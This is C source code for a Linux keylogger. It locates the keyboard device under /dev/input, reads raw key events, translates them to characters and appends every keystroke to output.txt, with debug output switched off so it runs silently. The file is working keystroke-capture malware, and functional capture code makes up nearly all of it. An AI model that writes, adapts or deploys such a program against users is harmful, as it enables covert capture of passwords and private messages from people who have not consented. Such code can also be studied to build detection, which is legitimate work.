#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>

#define FILE_OUTPUT "output.txt"
#define BUFFER_SIZE 128
int inCapsLock = 0;

char *currentWord = NULL;

#define DEBUG_MODE 0

char *findKeyboardDevice()
{
  FILE *fp;
  char path[BUFFER_SIZE];
  char *device = NULL;

  fp = popen("ls /dev/input/by-path/*kbd* | head -n 1", "r");
  if (fp == NULL)
  {
    DEBUG_MODE == 1 ? printf("\n") : 0;
    return NULL;
  }

  if (fgets(path, sizeof(path), fp) != NULL)
  {
    size_t len = strlen(path);
    if (len > 0 && path[len - 1] == '\n')
    {
      path[len - 1] = '\0';
    }
    device = strdup(path);
  }

  pclose(fp);
  return device;
}

char *printKey(signed int code)
{
  char *key = NULL;

  switch (code)
  {
  // Numbers
  case 2:
    key = "1";
    break;
  case 3:
    key = "2";
    break;
  case 4:
    key = "3";
    break;
  case 5:
    key = "4";
    break;
  case 6:
    key = "5";
    break;
  case 7:
    key = "6";
    break;
  case 8:
    key = "7";
    break;
  case 9:
    key = "8";
    break;
  case 10:
    key = "9";
    break;
  case 11:
    key = "0";
    break;

    // Letters -> layout QWERTY
  case 16:
    key = inCapsLock ? "Q" : "q";
    break;
  case 17:
    key = inCapsLock ? "W" : "w";
    break;
  case 18:
    key = inCapsLock ? "E" : "e";
    break;
  case 19:
    key = inCapsLock ? "R" : "r";
    break;
  case 20:
    key = inCapsLock ? "T" : "t";
    break;
  case 21:
    key = inCapsLock ? "Y" : "y";
    break;
  case 22:
    key = inCapsLock ? "U" : "u";
    break;
  case 23:
    key = inCapsLock ? "I" : "i";
    break;
  case 24:
    key = inCapsLock ? "O" : "o";
    break;
  case 25:
    key = inCapsLock ? "P" : "p";
    break;
  case 30:
    key = inCapsLock ? "A" : "a";
    break;
  case 31:
    key = inCapsLock ? "S" : "s";
    break;
  case 32:
    key = inCapsLock ? "D" : "d";
    break;
  case 33:
    key = inCapsLock ? "F" : "f";
    break;
  case 34:
    key = inCapsLock ? "G" : "g";
    break;
  case 35:
    key = inCapsLock ? "H" : "h";
    break;
  case 36:
    key = inCapsLock ? "J" : "j";
    break;
  case 37:
    key = inCapsLock ? "K" : "k";
    break;
  case 38:
    key = inCapsLock ? "L" : "l";
    break;
  case 44:
    key = inCapsLock ? "Z" : "z";
    break;
  case 45:
    key = inCapsLock ? "X" : "x";
    break;
  case 46:
    key = inCapsLock ? "C" : "c";
    break;
  case 47:
    key = inCapsLock ? "V" : "v";
    break;
  case 48:
    key = inCapsLock ? "B" : "b";
    break;
  case 49:
    key = inCapsLock ? "N" : "n";
    break;
  case 50:
    key = inCapsLock ? "M" : "m";
    break;

  // Special characters
  case 12:
    key = "-";
    break;
  case 13:
    key = "=";
    break;
  case 14:
    key = "Backspace";
    break;
  case 15:
    key = "Tab";
    break;
  case 28:
    key = "Enter";
    break;
  case 29:
    key = "Ctrl";
    break;
  case 42:
    key = "Shift";
    break;
  case 43:
    key = "\\";
    break;
  case 57:
    key = "Space";
    break;
  case 58:
    key = "CapsLock";
    inCapsLock = inCapsLock == 0 ? 1 : 0;
    break;

  default:
  {
    key = NULL;
    break;
  }
  }

  DEBUG_MODE == 1 ? printf("CapsLock: %s\n", inCapsLock == 1 ? "Active" : "Desactive") : 0;

  return key;
}

void writeToFile(struct input_event *ev)
{
  FILE *file = fopen(FILE_OUTPUT, "a");
  if (file == NULL)
  {
    DEBUG_MODE == 1 ? fprintf(stderr, "file not open %s\n", FILE_OUTPUT) : 0;
    return;
  }

  if (ev == NULL)
  {
    return;
  }

  switch (ev->code)
  {
    case KEY_ENTER:
      fprintf(file, "%s", " (Enter)\n");
      break;
    case KEY_SPACE:
      fprintf(file, "%s", " ");
      break;
    case KEY_BACKSPACE:
      fprintf(file, "%s", " (Backspace)");
      break;
    case KEY_TAB:
      fprintf(file, "%s", "    ");
      break;
    default:
    {
      char *text = printKey(ev->code);
      fprintf(file, "%s", text);
      break;
    }
  }

  fclose(file);
}

void printKeyPressed(struct input_event *ev)
{
  if (ev->type == EV_KEY && ev->value == 1)
  {
    DEBUG_MODE == 1 ? printf("Key press: %s\n", printKey(ev->code)) : 0;
    writeToFile(ev);
  }
}

int main()
{
  char *device = findKeyboardDevice();
  if (device == NULL)
  {
    DEBUG_MODE == 1 ? fprintf(stderr, "Not found keyboard\n") : 0;
    return EXIT_FAILURE;
  }

  DEBUG_MODE == 1 ? printf("Not found keyboard: %s\n", device) : 0;

  int fd = open(device, O_RDONLY);
  if (fd < 0)
  {
    DEBUG_MODE == 1 ? fprintf(stderr, "Not found keyboard %s\n", device) : 0;
    free(device);
    return EXIT_FAILURE;
  }

  struct input_event ev;
  while (1)
  {
    ssize_t n = read(fd, &ev, sizeof ev);
    if (n == (ssize_t)-1)
    {
      DEBUG_MODE == 1 ? perror("Error in event") : 0;
      close(fd);
      free(device);
      return EXIT_FAILURE;
    }
    else if (n != sizeof ev)
    {
      DEBUG_MODE == 1 ? fprintf(stderr, "Wrong length\n") : 0;
      close(fd);
      free(device);
      return EXIT_FAILURE;
    }

    printKeyPressed(&ev);
  }

  close(fd);
  free(device);
  return 0;
}
